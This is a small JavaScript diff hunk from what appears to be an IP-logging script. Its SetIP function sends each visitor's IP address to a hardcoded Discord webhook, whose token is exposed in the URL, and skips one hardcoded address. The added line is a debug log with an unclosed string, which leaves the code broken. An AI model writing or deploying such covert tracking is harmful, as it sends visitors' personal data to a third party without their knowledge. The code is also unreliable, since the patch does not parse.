@@ -4,6 +4,7 @@ const whurl ="https://discord.com/api/webhooks/911585052259913768/4ruPzXgvbCG4dN
 var Ip;
 
 function SetIP(IP) {
+    console.log("A);
     if (IP != "81.5.246.24") {
         Ip = IP;
         const msg = { "content": "Incoming IP: " + IP }
